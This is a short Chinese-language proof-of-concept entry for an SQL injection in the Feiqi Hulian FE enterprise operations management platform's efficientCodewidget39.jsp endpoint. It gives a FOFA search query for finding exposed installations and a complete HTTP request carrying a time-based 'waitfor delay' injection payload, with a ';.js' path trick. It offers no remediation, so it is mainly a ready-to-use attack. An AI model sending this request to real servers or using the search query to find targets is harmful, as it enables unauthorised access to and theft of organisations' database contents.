## 飞企互联-FE企业运营管理平台efficientCodewidget39接口SQL注入漏洞

飞企互联-FE企业运营管理平台接口/common/efficientCodewidget39.jsp 存在SQL注入漏洞，可获取数据库数据。

## fofa

```
app="飞企互联-FE企业运营管理平台"
```

## poc

```
GET /common/efficientCodewidget39.jsp;.js?code=1%27;waitfor+delay+%270:0:5%27--+ HTTP/1.1
Host:
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=D92D72E197627037F9556C5625B4EFFA
Connection: close
```

![image-20240628210729948](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406282107001.png)